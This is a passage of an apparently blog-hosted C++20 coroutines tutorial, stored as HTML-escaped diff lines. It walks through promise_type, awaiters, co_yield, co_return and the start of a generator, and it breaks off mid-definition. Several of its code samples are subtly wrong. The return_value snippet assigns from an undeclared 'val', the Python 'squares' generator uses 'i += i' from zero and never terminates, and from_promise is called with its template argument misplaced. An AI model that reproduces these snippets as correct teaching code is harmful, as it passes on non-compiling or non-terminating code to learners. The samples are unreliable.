+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Task&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;promise_type&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Task &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;get_return_object&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;unhandled_exception&lt;/span&gt;() {} &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// called when we have an unhandled exception
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;        MyAwaiter &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;initial_suspend&lt;/span&gt;() &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// TODO
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;        MyAwaiter final_suspend() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;noexcept&lt;/span&gt; &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// TODO
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What exactly is an &lt;em&gt;Awaitable&lt;/em&gt; then? Essentially it is something that a coroutine can wait for; a socket with data to read, a file handle waiting for data to write, etc. But for the compiler, all that matters is that it is something that can be passed into &lt;code&gt;co_await&lt;/code&gt;. When given something to &lt;code&gt;co_await&lt;/code&gt;, the coroutine will:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Check the boolean returned by &lt;code&gt;awaiter.await_ready()&lt;/code&gt;; if &lt;code&gt;true&lt;/code&gt; (the awaiter is ready), we don&amp;rsquo;t wait, and skip step 2.&lt;/li&gt;
+&lt;li&gt;Suspend the coroutine and call &lt;code&gt;awaiter.await_suspend(handle)&lt;/code&gt;. It is now the awaiter&amp;rsquo;s job to resume the coroutine using the handle, whenever the socket is ready or whatever. Ideally we would pass the handle to some kind of scheduling manager, which would resume the handle whenever the coroutine should be resumed.&lt;/li&gt;
+&lt;li&gt;Call &lt;code&gt;awaiter.await_resume()&lt;/code&gt; and gives its return value back to the coroutine as the value of the &lt;code&gt;co_await&lt;/code&gt; expression.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Given these requirements, let&amp;rsquo;s write an awaiter to return from the &lt;code&gt;initial_suspend&lt;/code&gt; function. Remember this will be awaited when the coroutine begins, but we don&amp;rsquo;t need to wait on anything, so let&amp;rsquo;s write an awaiter that is always ready.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;MyAwaiter&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_ready&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#0086b3&#34;&gt;true&lt;/span&gt;; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_suspend&lt;/span&gt;(std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; handle) {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_resume&lt;/span&gt;() {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This never-suspending awaiter is so common it comes pre-defined as &lt;code&gt;std::suspend_never&lt;/code&gt;. From now on we&amp;rsquo;ll use the std class, but it&amp;rsquo;s nice to know there&amp;rsquo;s no std magic happening inside. There&amp;rsquo;s also &lt;code&gt;std::suspend_always&lt;/code&gt;, which always suspends the coroutine, forcing it to be manually resumed later.&lt;/p&gt;
+&lt;p&gt;To write &lt;code&gt;my_async_function&lt;/code&gt;, we could do some real asynchronous work, but for simplicity let&amp;rsquo;s just make it immediately yield with the value &lt;code&gt;3&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Awaiter2&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_ready&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#0086b3&#34;&gt;true&lt;/span&gt;; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_suspend&lt;/span&gt;(std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt; handle) {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;await_resume&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;3&lt;/span&gt;; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Awaiter2 &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;my_async_function&lt;/span&gt;() { &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we&amp;rsquo;re almost done, but if we try and compile now we get a few errors:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;error: no member named &amp;#39;yield_value&amp;#39; in &amp;#39;promise_type&amp;#39;
+    co_yield result * 2;
+    ^~~~~~~~
+error: no member named &amp;#39;return_value&amp;#39; in &amp;#39;promise_type&amp;#39;
+    co_return result + 5;
+    ^~~~~~~~~
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course, we haven&amp;rsquo;t yet defined the behaviour when yielding or returning. The line &lt;code&gt;co_yield result * 2&lt;/code&gt; is actually equivalent to &lt;code&gt;co_await promise.yield_value(result * 2)&lt;/code&gt;. Typically we would store the yield value, then return a &lt;code&gt;std::suspend_always&lt;/code&gt; to immediately suspend the coroutine. Let&amp;rsquo;s store the yield value directly in the &lt;code&gt;promise_type&lt;/code&gt; struct.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;promise_type&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; value;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;suspend_always yield_value(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; val) { value &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; val; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; {}; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we need a &lt;code&gt;return_value&lt;/code&gt; function, which is called whenever we &lt;code&gt;co_return&lt;/code&gt; a value from the coroutine. We&amp;rsquo;ll just store the value again.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;promise_type&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; return_value(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; value) { value &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; val; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now our code compiles! It won&amp;rsquo;t do anything yet, so let&amp;rsquo;s write a &lt;code&gt;main&lt;/code&gt; to call this coroutine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Task task &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; my_coroutine(); &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// runs until the first suspension point; the co_yield
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; task.value() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;endl; &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// prints the value from the co_yield, aka 6
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    task.resume(); &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// the co_yield just suspended the coroutine
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;                   &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// resume it to run until the next suspension point
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; task.value() &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;endl; &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// prints the value from the co_return, aka 8
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We now need to write this interface in our &lt;code&gt;Task&lt;/code&gt; class. First, we&amp;rsquo;ll store an &lt;code&gt;std::coroutine_handle&lt;/code&gt;, which will allow us to resume the coroutine and access the &lt;code&gt;Promise&lt;/code&gt; type.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Task&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt;promise_type&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;gt;&lt;/span&gt; handle;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now when we construct the &lt;code&gt;Task&lt;/code&gt; we must give it the handle:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;promise_type&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Task get_return_object() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; { std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;coroutine_handle&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;from_promise&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt;promise_type&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;this&lt;/span&gt;) };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now our &lt;code&gt;.value()&lt;/code&gt; and &lt;code&gt;.resume()&lt;/code&gt; functions are easy to write, because they essentially just wrap functionality the &lt;code&gt;std::coroutine_handle&lt;/code&gt; gives us.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Task&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; value() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;return&lt;/span&gt; handle.promise().value;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;resume&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        handle.resume();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://godbolt.org/z/6zP9xTP51&#34;&gt;Try the code here&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;a-simple-generator-iterator&#34;&gt;A simple generator iterator&lt;/h2&gt;
+&lt;p&gt;Anyone who writes Python knows it has a very easy way of writing iterators using &lt;em&gt;generators&lt;/em&gt;, which allow writing suspendable and resumable code in a straight-line manner:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;get_squares&lt;/span&gt;(&lt;span style=&#34;color:#0086b3&#34;&gt;max&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    i &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#0086b3&#34;&gt;max&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;yield&lt;/span&gt; i&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;i
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        i &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;+=&lt;/span&gt; i
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;for&lt;/span&gt; square &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;in&lt;/span&gt; get_squares(&lt;span style=&#34;color:#099&#34;&gt;5&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#0086b3&#34;&gt;print&lt;/span&gt;(square)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Anyone who writes C++ knows writing iterators is complicated and annoying, so what if we used coroutines to allow us to write code like above?&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Generator &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;get_squares&lt;/span&gt;(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; max) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&lt;/span&gt; max; i&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;++&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;co_yield&lt;/span&gt; i&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;i;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;square&lt;/span&gt; : get_squares(&lt;span style=&#34;color:#099&#34;&gt;5&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; square &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;::&lt;/span&gt;endl;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is not only possible, it&amp;rsquo;s quite easy if you read through the explanation above! Let&amp;rsquo;s start by defining our return type and promise type.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;Generator&lt;/span&gt; {
